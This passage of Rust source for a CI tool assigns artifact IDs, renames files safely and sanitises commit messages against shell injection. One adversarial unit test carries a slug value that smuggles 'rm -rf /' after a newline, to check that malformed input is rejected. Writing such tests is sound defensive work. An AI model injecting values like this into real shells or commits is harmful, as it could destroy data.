                set_assigned_number(&content, item.assigned_number).with_context(|| {
                    format!(
                        "ci-assign-id: set_assigned_number on {} to {}",
                        redact_path(workspace, &current_path),
                        item.assigned_number
                    )
                })?;

            // [Round 3 Sec FINDING-12] Atomic publish via `NamedTempFile::new_in`.
            // POSIX rename is atomic for files on the same filesystem; we
            // rely on that to avoid half-written artifacts on crash.
            // Previous implementation used a deterministic `<path>.md.tmp`
            // sibling — concurrent ci-assign-id runs (parallel jobs in
            // matrix builds, or two workflow invocations on the same
            // ref) could collide on that path. `NamedTempFile::new_in`
            // mints a unique random suffix per call so writes don't
            // trample each other; the file is auto-removed on any error
            // path before `persist`.
            let parent = current_path.parent().ok_or_else(|| {
                anyhow::anyhow!(
                    "ci-assign-id: artifact path has no parent dir: {}",
                    redact_path(workspace, &current_path)
                )
            })?;
            let tmp = tempfile::NamedTempFile::new_in(parent).with_context(|| {
                format!(
                    "ci-assign-id: create tmp in {}",
                    redact_path(workspace, parent)
                )
            })?;
            std::fs::write(tmp.path(), new_content).with_context(|| {
                format!(
                    "ci-assign-id: write tmp {}",
                    redact_path(workspace, tmp.path())
                )
            })?;
            tmp.persist(&current_path).map_err(|e| {
                anyhow::anyhow!(
                    "ci-assign-id: rename {} -> {}: {}",
                    redact_path(workspace, e.file.path()),
                    redact_path(workspace, &current_path),
                    e.error
                )
            })?;

            // Phase 2.2 [CD-4]: rename file to its display-id-prefixed
            // target now that frontmatter is committed. Idempotent on
            // matching basename.
            if needs_rename
                && let Some(target_path) = rename_target_path(
                    workspace,
                    canonical_workspace.as_deref(),
                    &current_path,
                    &target_basename,
                )?
            {
                rename_artifact_file(workspace, &current_path, &target_path)?;
                current_path = target_path;
            }
        }

        let action = if dry_run {
            "would_assign".to_string()
        } else if needs_rename {
            "renamed_and_assigned".to_string()
        } else {
            "assigned".to_string()
        };

        assignments.push(Assignment {
            slug: item.candidate.slug.clone(),
            kind: kind_template_key,
            path: current_path.to_string_lossy().into_owned(),
            predicted_number: item.candidate.predicted_number,
            assigned_number: item.assigned_number,
            max_in_base: item.max_in_base,
            action,
        });
    }

    Ok((assignments, collisions))
}

/// Resolve the target path for a Phase 2.2 rename and validate it.
///
/// Returns:
/// * `Ok(Some(path))` — target path is safe (sibling of `from`, inside
///   workspace) and either does not exist OR is the same canonical file
///   as `from` (idempotent re-run on a fully-renamed artifact).
/// * `Ok(None)` — target already exists and points at the same file
///   (idempotent already-renamed case detected via canonicalize).
/// * `Err(_)` — target collides with a distinct existing file (refuse
///   to clobber) or escapes the workspace boundary.
///
/// The split keeps [`apply_plan`] readable while concentrating the
/// SEC-5/SEC-6 invariants for the rename target in one place.
fn rename_target_path(
    workspace: &Path,
    canonical_workspace: Option<&Path>,
    from: &Path,
    target_basename: &str,
) -> Result<Option<PathBuf>> {
    let parent = from.parent().with_context(|| {
        format!(
            "ci-assign-id: artifact has no parent dir: {}",
            redact_path(workspace, from)
        )
    })?;
    let target_path = parent.join(target_basename);

    // [SEC-6] target must stay inside the canonical workspace. We can
    // assemble the canonical target lexically because `parent` lives
    // inside the workspace (already canonicalized for the source path)
    // and `target_basename` is a pure filename with no path separators.
    if let Some(ws_canon) = canonical_workspace {
        // We canonicalize the parent (which exists) and assemble the
        // target by joining the bare basename — never canonicalize the
        // target itself before it exists.
        let parent_canon = std::fs::canonicalize(parent).with_context(|| {
            format!(
                "ci-assign-id: canonicalize parent {}",
                redact_path(workspace, parent)
            )
        })?;
        if !parent_canon.starts_with(ws_canon) {
            anyhow::bail!(
                "ci-assign-id: rename target parent {} escapes workspace [SEC-6]",
                redact_path(workspace, parent)
            );
        }
    }

    // Idempotent check: target == source after canonicalization means
    // we're being asked to rename a file to itself.
    if target_path == from {
        return Ok(None);
    }

    // Refuse to clobber a distinct existing file. If the target exists
    // and resolves to the same inode as `from` (extremely unlikely on
    // a sane FS but defensive), it's a no-op.
    if target_path.exists() {
        let from_canon = std::fs::canonicalize(from).ok();
        let to_canon = std::fs::canonicalize(&target_path).ok();
        if from_canon.is_some() && from_canon == to_canon {
            return Ok(None);
        }
        anyhow::bail!(
            "ci-assign-id: rename target {} already exists [SEC-5 collision]",
            redact_path(workspace, &target_path)
        );
    }

    Ok(Some(target_path))
}

/// Render the human-readable summary table.
pub fn render_human_summary(out: &CiAssignIdOutput) -> String {
    let mut s = String::new();
    s.push_str(&format!(
        "ci-assign-id (PR #{}, base={}, head={}{})\n",
        out.pr,
        out.base,
        out.head,
        if out.dry_run { ", dry-run" } else { "" }
    ));
    if out.summary.total_candidates == 0 {
        s.push_str("  No candidate artifacts found.\n");
        return s;
    }
    for a in &out.assignments {
        s.push_str(&format!(
            "  [{}] {} ({}): {}\n",
            a.action,
            display_id(&a.kind, a.assigned_number),
            a.slug,
            a.path,
        ));
    }
    if !out.collisions.is_empty() {
        s.push_str("Collisions:\n");
        for c in &out.collisions {
            s.push_str(&format!(
                "  {} ({}) ↔ {}; suggested: {}\n",
                c.slug, c.kind, c.conflicts_with_base_path, c.suggested_resolution
            ));
        }
    }
    s.push_str(&format!(
        "Summary: {} candidates, {} assigned, {} skipped, {} collisions (exit {})\n",
        out.summary.total_candidates,
        out.summary.assigned,
        out.summary.skipped_already_assigned,
        out.summary.collisions,
        out.summary.exit_code
    ));
    s
}

/// Render the JSON summary per CD-3.
pub fn render_json_summary(out: &CiAssignIdOutput) -> Result<String> {
    serde_json::to_string_pretty(out).context("serialize CiAssignIdOutput as JSON")
}

/// Format a display id like `PRD-074` from kind + assigned number.
///
/// PROB-060 Phase 0b CR-6 fix: `template_key().to_uppercase()` produced
/// `PROBLEM-060` / `SOLUTION-001` / `EVIDENCE-114` / `REFRESH-001` —
/// not the canonical project IDs (`PROB-060`, `SOL-001`, `EVID-114`,
/// `REF-001`). Map explicitly so commit messages, JSON output, и
/// human-readable summaries all agree с the rest of the system. Unknown
/// template keys fall back to `to_uppercase()` for forward-compatibility.
fn display_id(kind_template_key: &str, n: u32) -> String {
    let prefix = match kind_template_key {
        "prd" => "PRD",
        "rfc" => "RFC",
        "adr" => "ADR",
        "epic" => "EPIC",
        "spec" => "SPEC",
        "problem" => "PROB",
        "solution" => "SOL",
        "evidence" => "EVID",
        "note" => "NOTE",
        "refresh" => "REF",
        "memory" => "MEM",
        // Defensive fallback for any future kind не yet mapped above.
        other => return format!("{}-{:03}", other.to_uppercase(), n),
    };
    format!("{prefix}-{n:03}")
}

/// Sanitize a string for safe inclusion in a `git commit -m "<msg>"`
/// argument body (PROB-060 Phase 0b SEC-2 [CWE-94] Part C — defense in
/// depth).
///
/// Phase 0b workflow YAML uses an env-var pass для commit_msg, neutralizing
/// the `${{ }}` interpolation attack vector. This sanitizer is the
/// belt-and-suspenders second line: even если a future workflow refactor
/// reintroduces direct shell interpolation, или a downstream tool reads
/// `commit_message_suggested` field из JSON и feeds it to a shell, control
/// chars и shell metacharacters are already stripped. Slug shape
/// (`[a-z0-9-]+`) per SPEC-005 is the upper bound; we replace any char
/// outside `[A-Za-z0-9_./-]` с `_`. Note `.` и `_` allowed for tag-like
/// version refs but `'`, `"`, `` ` ``, `$`, `\\`, `;`, `|`, newline, etc.
/// always stripped.
fn sanitize_for_commit_msg(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '/' | '-') {
                c
            } else {
                '_'
            }
        })
        .collect()
}

/// Build the suggested commit message body per CD-1.
///
/// PROB-060 Phase 0b SEC-2 [CWE-94] Part C: every interpolated value
/// flows through [`sanitize_for_commit_msg`] before being concatenated
/// into the commit body. Even though the workflow YAML neutralizes
/// shell interpolation with an env-var pass, slugs могут carry control
/// chars (newlines breaking `git commit -m` quoting) или shell
/// metacharacters that confuse downstream tooling reading the JSON.
fn build_commit_message(pr: u64, assignments: &[Assignment]) -> String {
    if assignments.is_empty() {
        return String::new();
    }
    let mut listed: Vec<String> = Vec::new();
    for a in assignments {
        if a.action == "assigned" || a.action == "would_assign" {
            // display_id is always safe (mapped enum + integer).
            // Slug is PR-controlled YAML — sanitize before interpolation.
            listed.push(format!(
                "{} ({})",
                display_id(&a.kind, a.assigned_number),
                sanitize_for_commit_msg(&a.slug)
            ));
        }
    }
    if listed.is_empty() {
        return String::new();
    }
    format!(
        "chore(ci): assign artifact IDs for PR #{}\n\nAssigned: {}\n\nRefs: PROB-060, PRD-076, RFC-009 §Phase 0b",
        pr,
        listed.join(", ")
    )
}

/// Best-effort `owner/name` detection from `git remote get-url origin`.
///
/// Thin wrapper around [`parse_repo_from_url`] that handles the git
/// invocation. Separated from the parser so the URL-shape branches are
/// unit-testable in isolation (PROB-060 Phase 0b Round 2 [CR-6]).
fn detect_repo(workspace: &Path) -> String {
    let output = std::process::Command::new("git")
        .args(["remote", "get-url", "origin"])
        .current_dir(workspace)
        .output();
    match output {
        Ok(o) if o.status.success() => {
            let url = String::from_utf8_lossy(&o.stdout).trim().to_string();
            parse_repo_from_url(&url).unwrap_or(url)
        }
        _ => String::new(),
    }
}

/// Pure parser: extract `owner/name` (or `group/sub/name` for nested
/// providers like GitLab) from a git remote URL.
///
/// Accepts both SSH and HTTPS forms with or without a trailing `.git`:
/// - `git@github.com:org/repo.git` → `Some("org/repo")`
/// - `git@github.com:org/repo` → `Some("org/repo")`
/// - `https://github.com/org/repo.git` → `Some("org/repo")`
/// - `https://github.com/org/repo` → `Some("org/repo")`
/// - `git@gitlab.com:group/sub/repo.git` → `Some("group/sub/repo")`
/// - `""` / non-URL strings → `None`
pub fn parse_repo_from_url(url: &str) -> Option<String> {
    let url = url.trim();
    if url.is_empty() {
        return None;
    }
    let url = url.trim_end_matches(".git");

    // SSH form: user@host:path
    if let Some(idx) = url.rfind(':') {
        let tail = &url[idx + 1..];
        if tail.contains('/') && !tail.starts_with('/') {
            // Reject if the colon was part of `://` (HTTPS form falls through).
            let before = &url[..idx];
            if !before.ends_with(':') && !before.ends_with('/') {
                return Some(tail.to_string());
            }
        }
    }
    // HTTPS / scheme form: scheme://host/path
    if let Some(idx) = url.find("://") {
        let after = &url[idx + 3..];
        // path begins after the host segment
        if let Some(slash) = after.find('/') {
            let path = &after[slash + 1..];
            if !path.is_empty() && path.contains('/') {
                return Some(path.to_string());
            }
        }
        return None;
    }
    None
}

/// Reverse mapping `dir_name` (e.g. "prds") → ArtifactKind.
fn dir_name_to_kind(dir: &str) -> Option<ArtifactKind> {
    match dir {
        "prds" => Some(ArtifactKind::Prd),
        "rfcs" => Some(ArtifactKind::Rfc),
        "adrs" => Some(ArtifactKind::Adr),
        "epics" => Some(ArtifactKind::Epic),
        "specs" => Some(ArtifactKind::Spec),
        "problems" => Some(ArtifactKind::ProblemCard),
        "solutions" => Some(ArtifactKind::SolutionPortfolio),
        "evidence" => Some(ArtifactKind::EvidencePack),
        "notes" => Some(ArtifactKind::Note),
        "refresh" => Some(ArtifactKind::RefreshReport),
        "memory" => Some(ArtifactKind::Memory),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    /// Build a minimal workspace tree with the given (rel_path, content) pairs.
    fn make_ws(files: &[(&str, &str)]) -> TempDir {
        let tmp = TempDir::new().unwrap();
        for (rel, content) in files {
            let p = tmp.path().join(rel);
            fs::create_dir_all(p.parent().unwrap()).unwrap();
            fs::write(&p, content).unwrap();
        }
        tmp
    }

    fn artifact(slug: &str, predicted: u32, assigned: Option<&str>) -> String {
        let assigned_line = match assigned {
            Some(s) => format!("assigned_number: {s}\n"),
            None => "assigned_number: null\n".to_string(),
        };
        format!(
            "---\nslug: {slug}\npredicted_number: {predicted}\n{assigned_line}status: draft\n---\n\nbody\n"
        )
    }

    #[test]
    fn discover_candidates_empty_workspace() {
        let tmp = make_ws(&[]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert!(out.is_empty());
    }

    #[test]
    fn discover_candidates_single_artifact() {
        let tmp = make_ws(&[(
            ".forgeplan/prds/prd-auth-system.md",
            &artifact("prd-auth-system", 74, None),
        )]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].slug, "prd-auth-system");
        assert_eq!(out[0].kind, ArtifactKind::Prd);
        assert_eq!(out[0].predicted_number, Some(74));
        assert_eq!(out[0].current_assigned, None);
    }

    #[test]
    fn discover_candidates_skips_files_without_slug() {
        let tmp = make_ws(&[
            (
                ".forgeplan/prds/legacy.md",
                "---\nid: PRD-018\nstatus: active\n---\n\n",
            ),
            (".forgeplan/prds/new.md", &artifact("prd-new", 80, None)),
        ]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].slug, "prd-new");
    }

    #[test]
    fn discover_candidates_includes_already_assigned() {
        let tmp = make_ws(&[(
            ".forgeplan/prds/prd-x.md",
            &artifact("prd-x", 74, Some("74")),
        )]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert_eq!(out.len(), 1);
        assert_eq!(out[0].current_assigned, Some(74));
    }

    #[test]
    fn discover_candidates_stable_order() {
        let tmp = make_ws(&[
            (".forgeplan/prds/prd-b.md", &artifact("prd-b", 74, None)),
            (".forgeplan/prds/prd-a.md", &artifact("prd-a", 75, None)),
        ]);
        let out = discover_candidates(tmp.path()).unwrap();
        assert_eq!(out.len(), 2);
        assert_eq!(out[0].slug, "prd-a");
        assert_eq!(out[1].slug, "prd-b");
    }

    /// Init a git repo with files committed on `dev` (helper).
    fn init_git_with_files(files: &[(&str, &str)]) -> TempDir {
        use std::process::Command;
        let tmp = TempDir::new().unwrap();
        let work = tmp.path();
        Command::new("git")
            .args(["init", "--quiet", "--initial-branch=dev"])
            .current_dir(work)
            .status()
            .unwrap();
        for (k, v) in [("user.email", "test@local"), ("user.name", "Test")] {
            Command::new("git")
                .args(["config", k, v])
                .current_dir(work)
                .status()
                .ok();
        }
        fs::write(work.join(".gitkeep"), "").unwrap();
        for (rel, content) in files {
            let p = work.join(rel);
            fs::create_dir_all(p.parent().unwrap()).unwrap();
            fs::write(p, content).unwrap();
        }
        Command::new("git")
            .args(["add", "."])
            .current_dir(work)
            .status()
            .unwrap();
        Command::new("git")
            .args(["commit", "--quiet", "-m", "fix"])
            .current_dir(work)
            .status()
            .unwrap();
        tmp
    }

    #[test]
    fn compute_plan_assigns_sequential_starting_from_max_plus_one() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-existing.md",
            &artifact("prd-existing", 73, Some("73")),
        )]);
        let candidates = vec![
            Candidate {
                slug: "prd-new-a".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new-a.md"),
                predicted_number: Some(74),
                current_assigned: None,
            },
            Candidate {
                slug: "prd-new-b".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new-b.md"),
                predicted_number: Some(75),
                current_assigned: None,
            },
        ];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        assert_eq!(plan.len(), 2);
        assert_eq!(plan[0].assigned_number, 74);
        assert_eq!(plan[1].assigned_number, 75);
        assert_eq!(plan[0].max_in_base, Some(73));
    }

    #[test]
    fn compute_plan_idempotent_for_already_assigned() {
        let tmp = init_git_with_files(&[]);
        let candidates = vec![Candidate {
            slug: "prd-x".to_string(),
            kind: ArtifactKind::Prd,
            path: tmp.path().join("prd-x.md"),
            predicted_number: Some(74),
            current_assigned: Some(74),
        }];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        assert_eq!(plan.len(), 1);
        assert_eq!(plan[0].assigned_number, 74);
        assert!(plan[0].already_assigned);
    }

    #[test]
    fn compute_plan_starts_at_one_when_base_empty() {
        let tmp = init_git_with_files(&[]);
        let candidates = vec![Candidate {
            slug: "prd-first".to_string(),
            kind: ArtifactKind::Prd,
            path: tmp.path().join(".forgeplan/prds/prd-first.md"),
            predicted_number: Some(1),
            current_assigned: None,
        }];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        assert_eq!(plan.len(), 1);
        assert_eq!(plan[0].assigned_number, 1);
        assert_eq!(plan[0].max_in_base, None);
    }

    #[test]
    fn compute_plan_per_kind_independent_sequences() {
        let tmp = init_git_with_files(&[
            (
                ".forgeplan/prds/prd-existing.md",
                &artifact("prd-existing", 73, Some("73")),
            ),
            (
                ".forgeplan/rfcs/rfc-existing.md",
                &artifact("rfc-existing", 8, Some("8")),
            ),
        ]);
        let candidates = vec![
            Candidate {
                slug: "prd-new".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new.md"),
                predicted_number: Some(74),
                current_assigned: None,
            },
            Candidate {
                slug: "rfc-new".to_string(),
                kind: ArtifactKind::Rfc,
                path: tmp.path().join(".forgeplan/rfcs/rfc-new.md"),
                predicted_number: Some(9),
                current_assigned: None,
            },
        ];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        let prd_item = plan.iter().find(|p| p.candidate.slug == "prd-new").unwrap();
        let rfc_item = plan.iter().find(|p| p.candidate.slug == "rfc-new").unwrap();
        assert_eq!(prd_item.assigned_number, 74);
        assert_eq!(rfc_item.assigned_number, 9);
    }

    #[test]
    fn apply_plan_writes_frontmatter_when_not_dry_run() {
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("prd-x.md");
        fs::write(&path, artifact("prd-x", 74, None)).unwrap();
        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-x".to_string(),
                kind: ArtifactKind::Prd,
                path: path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let (assignments, collisions) = apply_plan(tmp.path(), &plan, false).unwrap();
        assert!(collisions.is_empty());
        assert_eq!(assignments.len(), 1);
        // PROB-060 Phase 2.2 [CD-4]: fresh-assign on a Phase-1 placeholder
        // filename produces both a frontmatter rewrite AND a rename, so
        // the action surfaces the additive `renamed_and_assigned` enum.
        assert_eq!(assignments[0].action, "renamed_and_assigned");
        // Old filename is gone, frontmatter rewrite landed on the new
        // display-id-prefixed filename.
        assert!(!path.exists(), "old filename should be removed by rename");
        let new_path = tmp.path().join("PRD-074-x.md");
        let updated = fs::read_to_string(&new_path).unwrap();
        assert!(updated.contains("assigned_number: 74"));
        assert!(
            assignments[0].path.ends_with("PRD-074-x.md"),
            "Assignment.path should reflect post-rename filename"
        );
    }

    #[test]
    fn apply_plan_dry_run_does_not_mutate_file() {
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("prd-x.md");
        let original = artifact("prd-x", 74, None);
        fs::write(&path, &original).unwrap();
        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-x".to_string(),
                kind: ArtifactKind::Prd,
                path: path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let (assignments, _) = apply_plan(tmp.path(), &plan, true).unwrap();
        assert_eq!(assignments[0].action, "would_assign");
        let after = fs::read_to_string(&path).unwrap();
        assert_eq!(after, original, "dry-run must not modify file");
    }

    #[test]
    fn apply_plan_already_assigned_emits_skipped() {
        // PROB-060 Phase 2.2 [CD-4]: pure no-op requires the candidate
        // filename to ALREADY match its display-id-prefixed target so
        // that `needs_rename` is false. Otherwise the recovery branch
        // kicks in and emits `renamed`. We use the canonical post-rename
        // filename here to test the genuine idempotent path.
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("PRD-074-x.md");
        fs::write(&path, artifact("prd-x", 74, Some("74"))).unwrap();
        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-x".to_string(),
                kind: ArtifactKind::Prd,
                path: path.clone(),
                predicted_number: Some(74),
                current_assigned: Some(74),
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: true,
            collision: None,
        }];
        let (assignments, _) = apply_plan(tmp.path(), &plan, false).unwrap();
        assert_eq!(assignments[0].action, "skipped_already_assigned");
        assert!(path.exists(), "no-op must not move the file");
    }

    #[test]
    fn apply_plan_collision_recorded_without_auto_suffix() {
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("prd-conflict.md");
        fs::write(&path, artifact("prd-conflict", 74, None)).unwrap();
        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-conflict".to_string(),
                kind: ArtifactKind::Prd,
                path: path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: Some("prd-conflict-74".to_string()),
        }];
        let (assignments, collisions) = apply_plan(tmp.path(), &plan, false).unwrap();
        assert_eq!(collisions.len(), 1);
        assert!(
            assignments.is_empty(),
            "collision must not produce assignment"
        );
        let after = fs::read_to_string(&path).unwrap();
        assert!(after.contains("assigned_number: null"));
    }

    #[test]
    fn render_human_summary_smoke() {
        let out = CiAssignIdOutput {
            schema_version: 1,
            ran_at: "2026-05-07T00:00:00Z".to_string(),
            pr: 123,
            repo: "ForgePlan/forgeplan".to_string(),
            base: "origin/dev".to_string(),
            head: "HEAD".to_string(),
            dry_run: false,
            assignments: vec![Assignment {
                slug: "prd-x".to_string(),
                kind: "prd".to_string(),
                path: "p.md".to_string(),
                predicted_number: Some(74),
                assigned_number: 74,
                max_in_base: Some(73),
                action: "assigned".to_string(),
            }],
            collisions: vec![],
            summary: Summary {
                total_candidates: 1,
                assigned: 1,
                skipped_already_assigned: 0,
                collisions: 0,
                exit_code: 0,
            },
            commit_message_suggested: String::new(),
        };
        let s = render_human_summary(&out);
        assert!(s.contains("PR #123"));
        assert!(s.contains("PRD-074"));
        assert!(s.contains("prd-x"));
        assert!(s.contains("Summary"));
    }

    #[test]
    fn render_json_summary_smoke() {
        let out = CiAssignIdOutput {
            schema_version: 1,
            ran_at: "2026-05-07T00:00:00Z".to_string(),
            pr: 0,
            repo: String::new(),
            base: "origin/dev".to_string(),
            head: "HEAD".to_string(),
            dry_run: false,
            assignments: vec![],
            collisions: vec![],
            summary: Summary {
                total_candidates: 0,
                assigned: 0,
                skipped_already_assigned: 0,
                collisions: 0,
                exit_code: 2,
            },
            commit_message_suggested: String::new(),
        };
        let json = render_json_summary(&out).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed["schema_version"], 1);
        assert_eq!(parsed["summary"]["exit_code"], 2);
        assert!(parsed["assignments"].is_array());
        assert!(parsed["collisions"].is_array());
    }

    #[test]
    fn build_commit_message_includes_assigned_only() {
        let assignments = vec![
            Assignment {
                slug: "prd-x".to_string(),
                kind: "prd".to_string(),
                path: "p.md".to_string(),
                predicted_number: None,
                assigned_number: 74,
                max_in_base: None,
                action: "assigned".to_string(),
            },
            Assignment {
                slug: "prd-y".to_string(),
                kind: "prd".to_string(),
                path: "y.md".to_string(),
                predicted_number: None,
                assigned_number: 75,
                max_in_base: None,
                action: "skipped_already_assigned".to_string(),
            },
        ];
        let msg = build_commit_message(123, &assignments);
        assert!(msg.contains("PR #123"));
        assert!(msg.contains("PRD-074"));
        assert!(msg.contains("prd-x"));
        assert!(!msg.contains("PRD-075"), "skipped should not appear");
    }

    #[test]
    fn dir_name_to_kind_round_trip() {
        for k in [
            ArtifactKind::Prd,
            ArtifactKind::Rfc,
            ArtifactKind::Adr,
            ArtifactKind::Epic,
            ArtifactKind::Spec,
            ArtifactKind::ProblemCard,
            ArtifactKind::SolutionPortfolio,
            ArtifactKind::EvidencePack,
            ArtifactKind::Note,
            ArtifactKind::RefreshReport,
            ArtifactKind::Memory,
        ] {
            assert_eq!(dir_name_to_kind(k.dir_name()), Some(k.clone()));
        }
        assert_eq!(dir_name_to_kind("unknown"), None);
    }

    #[test]
    fn run_no_candidates_exits_two() {
        let tmp = init_git_with_files(&[]);
        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "dev".to_string(),
            json: true,
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_NO_CANDIDATES);
    }

    #[test]
    fn run_full_assigns_and_writes() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-existing.md",
            &artifact("prd-existing", 73, Some("73")),
        )]);
        let new_path = tmp.path().join(".forgeplan/prds/prd-new.md");
        fs::write(&new_path, artifact("prd-new", 74, None)).unwrap();

        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "dev".to_string(),
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_SUCCESS);

        // PROB-060 Phase 2.2 [CD-4]: end-to-end run renames the new
        // artifact from `prd-new.md` → `PRD-074-new.md`. Existing
        // (already-assigned) artifact gets renamed too as part of the
        // recovery path: `prd-existing.md` → `PRD-073-existing.md`.
        assert!(!new_path.exists(), "fresh artifact must be renamed away");
        let renamed = tmp.path().join(".forgeplan/prds/PRD-074-new.md");
        let updated = fs::read_to_string(&renamed).unwrap();
        assert!(updated.contains("assigned_number: 74"));
    }

    #[test]
    fn run_dry_run_does_not_write() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-existing.md",
            &artifact("prd-existing", 73, Some("73")),
        )]);
        let new_path = tmp.path().join(".forgeplan/prds/prd-new.md");
        let original = artifact("prd-new", 74, None);
        fs::write(&new_path, &original).unwrap();
        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "dev".to_string(),
            dry_run: true,
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_SUCCESS);
        let after = fs::read_to_string(&new_path).unwrap();
        assert_eq!(after, original);
    }

    /// Tiny helper to drive an async future from a sync test.
    fn tokio_test_block<F: std::future::Future>(fut: F) -> F::Output {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        rt.block_on(fut)
    }

    // ---------------------------------------------------------------
    // PROB-060 Phase 0b — adversarial audit closure tests
    // ---------------------------------------------------------------

    /// FIX-2 Part B [CWE-94]: discover_candidates re-validates slug shape
    /// после frontmatter parse. Malformed slug coming from PR-controlled
    /// YAML (e.g. embedded newline, shell metacharacters) must be rejected
    /// before reaching commit_message_suggested.
    #[test]
    fn discover_candidates_rejects_malformed_slug() {
        // Slug с newline — would break `git commit -m "..."` quoting.
        let tmp = make_ws(&[(
            ".forgeplan/prds/prd-evil.md",
            "---\nslug: \"prd-evil\\nrm -rf /\"\nassigned_number: null\n---\n\nbody\n",
        )]);
        let result = discover_candidates(tmp.path());
        assert!(
            result.is_err(),
            "malformed slug must be rejected: {:?}",
            result.ok()
        );
    }

    /// FIX-2 Part B: even a slug that's just the wrong shape (uppercase,
    /// reserved prefix, etc.) must be rejected at read time.
    #[test]
    fn discover_candidates_rejects_uppercase_slug() {
        let tmp = make_ws(&[(
            ".forgeplan/prds/prd-mixed.md",
            "---\nslug: PRD-Auth\nassigned_number: null\n---\n\nbody\n",
        )]);
        let result = discover_candidates(tmp.path());
        assert!(
            result.is_err(),
            "uppercase slug must be rejected at read path"
        );
    }

    /// FIX-5 [CR-2]: when frontmatter is unparseable, surface a warning
    /// to stderr but continue с remaining candidates.
    #[test]
    fn discover_candidates_warns_on_parse_error_continues_others() {
        let tmp = make_ws(&[
            (
                ".forgeplan/prds/prd-good.md",
                &artifact("prd-good", 74, None),
            ),
            (
                ".forgeplan/prds/prd-bad.md",
                "---\nthis is :: not valid : yaml\n   bad: [unclosed\n---\nbody\n",
            ),
        ]);
        // We can't capture stderr cleanly от unit tests без extra
        // infrastructure, but we can assert the core invariant: 1 valid
        // candidate returned, no error propagated.
        let result = discover_candidates(tmp.path()).expect("must continue past parse error");
        assert_eq!(
            result.len(),
            1,
            "expected 1 valid candidate, got {result:?}"
        );
        assert_eq!(result[0].slug, "prd-good");
    }

    /// FIX-4 [CR-1]: when one candidate carries assigned_number=80 (from
    /// a previous workflow run) и other two carry null, the sequence
    /// counter must absorb 80 — not start от max_in_base = 73.
    /// Pre-fix output would be: 80 (skip) + 74 + 75 — duplicates!
    #[test]
    fn compute_plan_mixed_assigned_and_null_no_duplicates() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-existing.md",
            &artifact("prd-existing", 73, Some("73")),
        )]);
        // Three candidates: one already 80, two null.
        let candidates = vec![
            Candidate {
                slug: "prd-already".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-already.md"),
                predicted_number: Some(80),
                current_assigned: Some(80),
            },
            Candidate {
                slug: "prd-new-a".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new-a.md"),
                predicted_number: None,
                current_assigned: None,
            },
            Candidate {
                slug: "prd-new-b".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new-b.md"),
                predicted_number: None,
                current_assigned: None,
            },
        ];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        assert_eq!(plan.len(), 3);
        // First (already-assigned) keeps 80.
        let already = plan
            .iter()
            .find(|p| p.candidate.slug == "prd-already")
            .unwrap();
        assert_eq!(already.assigned_number, 80);
        assert!(already.already_assigned);
        // Next two get 81, 82 — NOT 74, 75 (which would collide с 80).
        let a = plan
            .iter()
            .find(|p| p.candidate.slug == "prd-new-a")
            .unwrap();
        let b = plan
            .iter()
            .find(|p| p.candidate.slug == "prd-new-b")
            .unwrap();
        let mut nums = [a.assigned_number, b.assigned_number];
        nums.sort();
        assert_eq!(
            nums,
            [81, 82],
            "expected 81+82 после absorbing 80, got {nums:?}"
        );
    }

    /// FIX-4 edge case: existing assigned_number is *below* max_in_base.
